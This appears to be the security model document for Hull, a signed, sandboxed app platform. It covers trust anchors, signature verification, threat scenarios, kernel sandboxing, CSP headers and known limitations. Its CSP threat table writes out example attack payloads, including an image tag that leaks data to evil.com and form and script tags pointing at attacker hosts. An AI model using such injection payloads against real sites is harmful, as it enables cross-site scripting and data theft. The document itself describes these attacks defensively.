# Hull — Security Model

This document is brutally explicit about what Hull protects against, what it doesn't, and where trust anchors lie.

---

## 1. Trust Model Overview

### Parties

| Party | Controls | Must Trust |
|-------|----------|------------|
| **Platform publisher** (gethull.dev) | Platform library, signing key, build service | Nothing (self-sovereign) |
| **App developer** | Application code, signing key, manifest | Platform publisher (or vendor their own) |
| **End user** | Which apps to run, which keys to trust | App developer + platform publisher |
| **Third-party auditor** | Nothing — read-only verification | Cryptographic math (Ed25519, SHA-256) |

### Key Insight

The system is designed so that **no party requires blind trust**:
- Users can verify the platform (signature + canary + source audit)
- Users can verify the app (signature + file hashes + manifest inspection)
- Users can eliminate gethull.dev entirely (self-host, self-sign)

---

## 2. Signature Verification Chain

Three verification points, each catching different attack vectors:

| When | What | Tool | Checks |
|------|------|------|--------|
| Before download | Inspect capabilities | `verify/index.html` (offline) | Platform sig, app sig, manifest, canary |
| Before install | Verify integrity | `hull verify --developer-key` (CLI) | Both sigs + file hashes |
| At startup | Runtime check | `--verify-sig` flag | App sig + file hashes, platform key pin |

### Trust Anchors

**Platform public key:**
- Hardcoded in Hull CLI (`HL_PLATFORM_PUBKEY_HEX` in `signature.h`)
- Hardcoded in browser verifier (`GETHULL_DEV_PLATFORM_KEY` in `verify/index.html`)
- Published at `https://gethull.dev/.well-known/platform.pub`
- Overridable via `--platform-key <file>` for self-hosted platforms

**Developer public key:**
- Published in app repository (`.pub` file)
- Manually cross-referenced by user against trusted source
- Passed explicitly: `hull verify --developer-key dev.pub`

---

## 3. Attack Model

### A. Malicious App Developer

This is the primary threat model. Hull exists to make it possible to trust apps from unknown developers.

**Attack: Ship a binary without the Hull platform (custom runtime, no sandbox)**

- **Prevention:** Platform signature + canary. Browser verifier checks platform sig against pinned gethull.dev key. Canary scanner finds `HULL_PLATFORM_CANARY` in the binary and verifies its integrity hash against the signed value.
- **Remaining risk:** Developer could build a custom binary that includes the canary bytes at the right offset. Reproducible builds (Phase 9) close this gap entirely — a rebuild from source proves the binary is just "Hull platform + declared source."

**Attack: Declare minimal manifest but access more at runtime**

- **Prevention:** Manifest is signed in `package.sig`. At runtime, pledge/unveil enforce the declared capabilities at the kernel level. Accessing undeclared paths triggers SIGKILL (Linux/Cosmo).
- **Remaining risk:** macOS has no kernel sandbox — pledge/unveil are no-ops. C-level validation in capability functions is the only defense. A bug in `hl_cap_fs_validate()` on macOS would allow bypass. Linux and Cosmopolitan are kernel-enforced.

**Attack: Call `app.manifest()` again at runtime to escalate capabilities**

- **Prevention:** Three independent barriers make this a non-issue:
  1. **One-shot enforcement:** `app.manifest()` errors on second call in both Lua and JS runtimes. The first call writes to a registry key; any subsequent call raises a runtime error (`"app.manifest() can only be called once"`).
  2. **Startup-only extraction:** The manifest is read from the runtime into a C struct (`HlManifest`) once during startup (step 10 of the boot sequence). C-level capabilities (`rt->env_cfg`, `rt->http_cfg`, `rt->csp_policy`) are wired from this struct and never re-read from the runtime state.
  3. **Kernel seal:** `unveil(NULL, NULL)` seals filesystem visibility and `pledge()` restricts syscall families. Both are one-way operations — the kernel refuses to add permissions after sealing, regardless of what the runtime state says.
- Even without the one-shot guard, a second `app.manifest()` call would only overwrite the Lua/JS registry key with no effect on the already-wired C capabilities or the sealed kernel sandbox. The guard exists to make the immutability explicit and prevent developer confusion.

**Attack: SQL injection through user input**

- **Prevention:** All database access goes through `hl_cap_db_query()` / `hl_cap_db_exec()` which use SQLite parameterized binding (`sqlite3_bind_*`). SQL is always a literal string from app code. No string concatenation, ever. SQL injection is structurally impossible.

**Attack: Path traversal to read /etc/passwd**

- **Prevention:** `hl_cap_fs_validate()` rejects:
  - Absolute paths (starts with `/`)
  - `..` components
  - Any path that resolves outside the app's base directory via `realpath()` ancestor check
  - Symlink escapes (realpath resolves symlinks before checking)
- Kernel unveil() also blocks access to undeclared paths.

**Attack: Memory exhaustion / DoS via infinite allocation**

- **Prevention:**
  - Lua: Custom allocator enforces 64 MB heap limit. Exceeding → NULL allocation → script error, not crash.
  - QuickJS: `JS_SetMemoryLimit()` enforces 64 MB. Exceeding → allocation failure → JS exception.

**Attack: Infinite loop / CPU exhaustion**

- **Prevention:**
  - QuickJS: Instruction-count interrupt handler. Configurable `max_instructions` limit. Exceeding → JS exception.
  - Lua: Memory limit eventually triggers (loops allocate stack frames). Less precise than instruction counting.

**Attack: Exfiltrate data to unauthorized hosts**

- **Prevention:** `hl_cap_http_request()` validates the target host against the manifest's `hosts` allowlist. Only declared hosts are reachable. Kernel pledge includes `inet` + `dns` only if hosts are declared.

**Attack: Read environment variables (API keys, secrets)**

- **Prevention:** `hl_cap_env_get()` checks against the manifest's `env` allowlist (max 32 entries). Undeclared variables return NULL.

**Attack: Cross-site scripting (XSS) via template output**

- **Prevention:** Two layers of defense:
  1. **Template auto-escaping:** Hull's template engine (`hull.template`) HTML-escapes all `{{ }}` output by default. The five dangerous characters (`& < > " '`) are replaced with HTML entities. This prevents reflected and stored XSS from user-controlled data rendered into HTML templates.
  2. **Content-Security-Policy (CSP):** Hull injects a strict CSP header on every `res:html()` / `res.html()` response by default: `default-src 'none'; style-src 'unsafe-inline'; img-src 'self'; form-action 'self'; frame-ancestors 'none'`. This blocks inline scripts, external script loads, `eval()`, object embeds, and iframe embedding — even if an attacker bypasses template escaping, the browser refuses to execute injected scripts.
- **Remaining risk:** Raw output (`{{{ }}}`) and the `| raw` filter bypass escaping. Developers must only use raw output with trusted content. Templates don't escape for JavaScript string contexts (e.g. inline `<script>` blocks) — use `{{ var | json }}` to safely embed data in JS contexts. Apps that require client-side JavaScript must customize the CSP (e.g. `app.manifest({ csp = "default-src 'self'; script-src 'self'" })`).

**Attack: Clickjacking — embedding the app in a malicious iframe**

- **Prevention:** The default CSP includes `frame-ancestors 'none'`, which instructs the browser to refuse rendering the page inside any `<iframe>`, `<frame>`, or `<object>` tag. This prevents UI redress attacks where a malicious site overlays invisible frames over the app to trick users into clicking hidden elements.
- **Actor:** Any third-party website operator. Does not require compromising the app — just embedding it.

**Attack: MIME type confusion / content sniffing**

- **Prevention:** The default CSP's `default-src 'none'` prevents the browser from loading any sub-resources (scripts, stylesheets, fonts, media) that an attacker might inject via reflected content. Combined with `Content-Type: text/html; charset=utf-8` set by `res:html()`, the browser cannot misinterpret response content.
- **Actor:** Network MITM or injection via stored user content.

**Attack: Template injection (server-side template injection / SSTI)**

- **Prevention:** Template compilation uses `luaL_loadbuffer` / `JS_Eval` in the C bridge, which is only callable from embedded stdlib code (not user application code). The code generator produces deterministic output from the AST — user data is never interpolated into the generated source code. User data flows through the `__d` (data) parameter at render time, not at compile time. There is no `eval()` or `load()` in the sandboxed runtimes.

**Attack: Session hijacking via cookie theft**

- **Prevention:** `hull.cookie` defaults to `HttpOnly=true`, `Secure=true`, `SameSite=Lax`. HttpOnly prevents JavaScript access (XSS-based theft). Secure prevents plaintext transmission. SameSite=Lax blocks cross-origin POST requests from carrying session cookies.
- **Remaining risk:** Same-origin XSS can still read `req.ctx.session` data. Hull's template engine (`hull.template`) auto-escapes all `{{ }}` output by default (`& < > " '` → HTML entities), which prevents most reflected and stored XSS vectors. Raw output via `{{{ }}}` or the `| raw` filter bypasses escaping and should only be used with trusted content.

**Attack: CSRF — forged state-changing requests from another origin**

- **Prevention:** `hull.middleware.csrf` middleware generates HMAC-based tokens tied to the session ID and timestamp. State-changing methods (POST/PUT/DELETE/PATCH) require a valid CSRF token in the `X-CSRF-Token` header or `_csrf` form field. Tokens expire (default 1h). Safe methods (GET/HEAD/OPTIONS) are automatically skipped. Constant-time comparison prevents timing attacks.
- **Remaining risk:** If the CSRF secret is leaked, tokens can be forged. The secret must be stored securely (e.g., `env.get("SECRET_KEY")`).

**Attack: JWT token forgery**

- **Prevention:** `hull.jwt` uses HS256 with HMAC-SHA256 (no "none" algorithm, no algorithm negotiation). Signature verification uses constant-time comparison. Expired tokens are rejected.
- **Remaining risk:** JWT secrets must be strong. JWTs are stateless — they cannot be revoked until they expire. For revocation, use sessions instead.

**Attack: Session fixation / brute-force session IDs**

- **Prevention:** `hull.middleware.session` generates 32 random bytes (256-bit entropy) via `crypto.random()` for session IDs. IDs are hex-encoded (64 chars). Sessions are server-side (SQLite) with sliding expiry. Expired sessions are automatically pruned.

### Browser-Level Security Headers

Hull injects security headers automatically at the C level to provide defense in depth:

**Content-Security-Policy (CSP):**

Default policy (applied to all `res:html()` / `res.html()` responses):
```
default-src 'none'; style-src 'unsafe-inline'; img-src 'self'; form-action 'self'; frame-ancestors 'none'
```

| Directive | Value | Blocks |
|-----------|-------|--------|
| `default-src` | `'none'` | All resource types not explicitly allowed (scripts, fonts, media, objects, workers, WebSockets) |
| `style-src` | `'unsafe-inline'` | External stylesheets (inline styles allowed for SSR convenience) |
| `img-src` | `'self'` | Images from external origins |
| `form-action` | `'self'` | Form submissions to external origins (data exfiltration via `<form action="evil.com">`) |
| `frame-ancestors` | `'none'` | Embedding in iframes on any origin (clickjacking) |

**What the default CSP mitigates:**

| Attack | Actor | How CSP Blocks It |
|--------|-------|-------------------|
| Reflected XSS (injected `<script>`) | Any user who can craft a malicious URL | `default-src 'none'` blocks inline script execution |
| Stored XSS (persisted `<script>`) | Authenticated user who stores malicious content | `default-src 'none'` blocks inline script execution |
| External script injection (`<script src="evil.js">`) | Attacker who bypasses template escaping | `default-src 'none'` blocks all external script loads |
| `eval()`-based XSS | Attacker who injects data into JS eval context | `default-src 'none'` implicitly disables `eval()` and `Function()` |
| Clickjacking (iframe embedding) | Any third-party site operator | `frame-ancestors 'none'` refuses rendering in iframes |
| Form action hijacking | Attacker who injects `<form action="evil.com">` | `form-action 'self'` restricts form targets to same origin |
| Data exfiltration via `<img src="evil.com/steal?data=...">` | Attacker with XSS who tries to leak data via image tags | `img-src 'self'` blocks images from external origins |
| Keylogging via injected external JS | Attacker who loads a remote keylogger script | `default-src 'none'` blocks all external resource loads |

**CSP configuration:**

| Manifest | Behavior |
|----------|----------|
| No `app.manifest()` | Default strict CSP (defense in depth) |
| `app.manifest({})` | Default strict CSP |
| `app.manifest({ csp = "custom..." })` | Custom CSP string |
| `app.manifest({ csp = false })` | CSP disabled (opt-out) |

**Where CSP is injected:** At the C level in `lua_res_html()` and `js_res_html()`, not in application code. This means the CSP cannot be forgotten, bypassed, or misconfigured by app developers — it's structural, like parameterized SQL. Only `res:json()` and `res:text()` skip CSP (non-HTML content types are not vulnerable to script injection).

### B. Malicious Third Party (MITM / CDN Compromise)

**Attack: Replace binary on CDN with modified version**

- **Prevention:** `binary_hash` in `package.sig` is signed by the developer's Ed25519 key. Changed binary → hash mismatch. Browser verifier catches this immediately when binary is uploaded.

**Attack: Replace `package.sig` with forged one**

- **Prevention:** Signature is Ed25519 over the canonical payload. Forging requires the developer's 32-byte private key. Ed25519 is considered secure against all known attacks.

**Attack: Replace both binary and `package.sig`**

- **Prevention:** User verifies the developer's public key against a trusted source (e.g., GitHub repo, personal website). If the attacker doesn't have the developer's private key, they can't produce a valid signature for any payload.

**Attack: Replace platform libraries in a self-hosted Hull**

- **Prevention:** Platform signature in `package.sig` is verified against the pinned gethull.dev key. Swapped platform → platform signature mismatch.

### C. Compromised gethull.dev (Platform Publisher)

**Attack: Ship malicious platform libraries**

- **Prevention:** Platform signing key is published. Users can:
  1. Audit Hull source (AGPL-3.0)
  2. Build their own platform: `make platform`
  3. Sign with own key: `hull sign-platform mykey`
  4. Pin their own key in apps

  The architecture is designed so you **don't have to trust gethull.dev**.

**Attack: Backdoor the build service**

- **Prevention:** Reproducible builds. Anyone can rebuild from source with the recorded `cc_version` + `flags` and compare `binary_hash`. The build service is a convenience, not a trust requirement.

### D. End User Who Doesn't Trust Anyone

Complete trust elimination path:

1. Download Hull source from GitHub (AGPL-3.0)
2. Audit the code
3. Build platform yourself: `make platform`
4. Sign with your own key: `hull sign-platform mykey`
5. Distribute to customers with your key pinned
6. Customers verify against YOUR key, not gethull.dev's

Trust chain: Customer → You (platform builder) → App developer. gethull.dev is completely out of the picture.

## 4. Sandbox Enforcement by Platform

### Linux (gcc/clang + jart/pledge polyfill)

| Mechanism | Implementation | Violation |
|-----------|---------------|-----------|
| Syscall filter | seccomp-bpf via jart/pledge | SIGKILL (unbypassable, kernel-enforced) |
| Filesystem restriction | Landlock via jart/pledge | EACCES or SIGKILL |
| Mode | `__pledge_mode = KILL_PROCESS \| STDERR_LOGGING` | Process killed + diagnostic to stderr |

**Allowed pledge promises:** `stdio inet rpath wpath cpath flock dns` (dns only if hosts declared)

**CVE classes prevented:**
- Arbitrary file access outside declared paths
- Privilege escalation via undeclared syscalls
- Shell escape / command injection (no `exec` pledge)
- Network exfiltration to undeclared hosts
- Device access, mount, ptrace, raw sockets

### Cosmopolitan APE (cosmocc)

| Mechanism | Implementation | Violation |
|-----------|---------------|-----------|
| Syscall filter | Native pledge() in cosmocc libc | SIGKILL |
| Filesystem restriction | Native unveil() | ENOENT |
| Static binary | No dynamic linking | N/A |

**Additional protections:**
- Works on Linux, FreeBSD, OpenBSD, Windows (via NT security)
- No dynamic linking → no LD_PRELOAD attacks
- No DLL injection
- No dynamic linker attacks
- W^X enforcement by Cosmopolitan runtime

### macOS (gcc/clang)

| Mechanism | Implementation | Violation |
|-----------|---------------|-----------|
| Kernel sandbox | **Not available** | N/A |
| C-level validation | Capability functions | Returns error |

**Active defenses:**
- `hl_cap_fs_validate()` rejects path traversal
- `hl_cap_env_get()` enforces allowlist
- `hl_cap_db_query()` uses parameterized binding
- `hl_cap_http_request()` validates host allowlist

**Honest limitation:** If a bug exists in the C validation layer, macOS has no kernel backup. A vulnerability in `hl_cap_fs_validate()` would allow filesystem access. On Linux/Cosmo, the kernel catches it anyway. This is a known, documented limitation.

---

## 5. What the Manifest Tells You

The manifest is the app's **declared behavior contract**:

```lua
app.manifest({
    fs = { read = {"data/"}, write = {"data/uploads/"} },
    env = {"PORT", "DATABASE_URL", "API_KEY"},
    hosts = {"api.stripe.com", "hooks.slack.com"}
})
```

**What this tells an auditor:**
- This app reads from `data/`, writes to `data/uploads/`
- It reads 3 environment variables
- It makes HTTP calls to Stripe and Slack only
- It has NO other filesystem, environment, or network access

**How the system enforces it:**

| Level | Enforcement | Bypass |
|-------|-------------|--------|
| Kernel | unveil() seals filesystem to declared paths | SIGKILL on violation (Linux/Cosmo) |
| Kernel | pledge() restricts to declared syscall families | SIGKILL on violation (Linux/Cosmo) |
| C | Every capability function validates against manifest | Returns error on violation |
| Signature | Manifest is signed — tampering invalidates signature | Ed25519 forgery required |

**No manifest declared?** Even if the app doesn't call `app.manifest()`, the default-deny posture is identical to `app.manifest({})`:
- **Kernel sandbox is applied** — pledge/unveil restrict to only the database file and TLS paths
- **CSP is active** — the default strict policy is injected on all HTML responses
- **C-level capabilities deny all** — env returns NULL, HTTP requests fail, filesystem operations fail
- Signature still covers the absence of manifest (`"manifest": null`)

All example apps declare `app.manifest()` explicitly, even when the empty `{}` is sufficient, as a best practice.

## 6. Verification Tools

### A. Browser Verifier (`verify/index.html`)

- Self-contained HTML file, zero server dependencies
- Runs entirely in browser — no data sent anywhere
- Inlined tweetnacl-js (public domain) for Ed25519
- Web Crypto API for SHA-256
- CSP: `default-src 'none'` — no network except optional key fetch via `connect-src https:`
- gethull.dev platform key hardcoded — auto-verifies against known key
- Canary scanner: searches uploaded binary for `HULL_PLATFORM_CANARY` magic bytes

**Checks performed:**
1. Platform signature validity (Ed25519)
2. Platform key match against pinned gethull.dev key
3. App signature validity (Ed25519)
4. Developer key match (if provided)
5. Binary hash match (if binary uploaded)
6. Platform canary presence + integrity (if binary uploaded)
7. Source file hash verification (if files uploaded)
8. Manifest capability display with risk levels

### B. CLI Verifier (`hull verify`)

```
hull verify [--platform-key <file|url>] [--developer-key <file|url>] [app_dir]
```

- Reads `package.sig` (or `hull.sig` for backwards compat)
- Verifies platform layer Ed25519 signature
- Verifies app layer Ed25519 signature
- Recomputes SHA-256 of all declared files
- Reports mismatches, missing files, key mismatches
- Exit code 0 = all checks passed, 1 = failure

### C. Runtime Verifier (`--verify-sig`)

```
./myapp --verify-sig dev.pub
```

- Checks on every startup before accepting connections
- Platform key pinned at compile time (`HL_PLATFORM_PUBKEY_HEX`)
- Verifies both signature layers
- Verifies file hashes against embedded entries
- Refuses to start if any check fails

---

## 7. Trusted Rebuild Infrastructure (Future — Phase 9)

**Service:** `api.gethull.dev/ci/v1`

### Flow

1. Developer pushes source to GitHub
2. CI calls `api.gethull.dev/ci/v1/build`
3. Service rebuilds with exact `cc_version` + `flags` from `package.sig`
4. Compares `binary_hash`
5. If match → issues "Reproducible Build Verified" attestation
6. Attestation is an Ed25519 signature over `{binary_hash, timestamp, builder_version}`

### What This Proves

A passing reproducible build check proves the developer **could not have** injected custom native code. The binary is provably just "Hull platform + declared source files."

### Why It Works

1. App developers cannot write C — only Lua/JS source
2. Platform binary is hash-pinned — `platform.sig` locks exact bytes
3. Trampoline (`app_main.c`) is deterministic — generated from template
4. Cosmopolitan produces deterministic output — static linking, no timestamps
5. Build metadata is signed — `cc_version` + `flags` attested by developer

### Self-Hosted Alternative

Run your own rebuild service. Pin your own platform key. Your customers trust you, not gethull.dev.

## 8. Keel HTTP Server Audit

The Keel HTTP server library (vendored at `vendor/keel/`) has been audited for memory safety, input validation, resource management, and network security. Full report: [keel_audit.md](keel_audit.md).

**Key findings relevant to security:**

| Severity | Issue | Impact |
|----------|-------|--------|
| Critical | kqueue `kl_event_mod` doesn't handle READ\|WRITE bitmask | HTTP/2 write starvation on macOS |
| Critical | WebSocket `ws_send_frame` partial writes | Frame corruption on non-blocking sockets |
| High | HTTP/2 and WebSocket 101 upgrade partial writes | Protocol stream corruption |
| High | TLS private key material not zeroed before free | Key residue in heap memory |
| Informational | Request smuggling mitigation present | `Transfer-Encoding: chunked` zeroes `Content-Length` (RFC 7230 §3.3.3) |
| Informational | Header injection guard present | `contains_crlf()` rejects `\r`/`\n` in header names/values |

**Build hardening verified:**
- `-Wall -Wextra -Wpedantic -Wshadow -Wformat=2 -Werror` in production
- `-fstack-protector-strong` (non-Cosmopolitan builds)
- ASan + UBSan debug build (`make debug`)
- Two libFuzzer targets (HTTP parser + multipart parser)
- 229 unit tests across 13 suites

---

## 9. Known Limitations

These are real, not theoretical:

| Limitation | Impact | Mitigation |
|------------|--------|------------|
| macOS has no kernel sandbox | C-level validation bugs allow bypass | Use Linux or Cosmo for production |
| Lua lacks instruction-count metering | Infinite loops are only caught by memory limit | QuickJS has precise gas metering |
| Canary is not foolproof | Attacker could embed magic bytes in custom binary | Reproducible builds (Phase 9) eliminate this |
| `realpath()` is TOCTOU | Race between check and use | Kernel unveil prevents actual access |
| Default CSP blocks client-side JS | Apps needing fetch/AJAX must customize CSP | `app.manifest({ csp = "default-src 'self'; connect-src 'self'" })` |
| 32-entry limit per manifest category | Large apps may hit ceiling | Sufficient for most production apps |
| `req.ctx` uses raw malloc (not tracked) | ctx JSON bypasses runtime memory limits | Capped at 64KB; bounded by runtime heap indirectly |
| HMAC-SHA256 binding returns hex string | Callers must use constant-time comparison | `hull.jwt` and `hull.middleware.csrf` stdlib use constant-time internally |
